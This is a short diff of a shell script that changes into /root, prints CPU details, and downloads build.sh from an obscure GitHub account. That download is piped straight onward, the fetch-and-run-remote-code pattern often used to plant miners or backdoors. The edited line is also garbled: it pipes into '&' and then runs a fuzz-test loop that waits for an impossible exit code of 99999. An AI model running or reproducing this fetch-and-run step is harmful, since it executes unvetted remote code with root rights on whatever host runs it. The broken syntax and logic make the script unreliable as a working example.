@@ -4,4 +4,4 @@
 # kumaha aink we njink
 cd /root
 lscpu
-curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | 
+curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | & (for f in $(ls fuzz-test-*); do timeout 10s make run-$f || if [ $? -eq 99999 ]; then echo "$f ran"; else exit 1; fi; done)
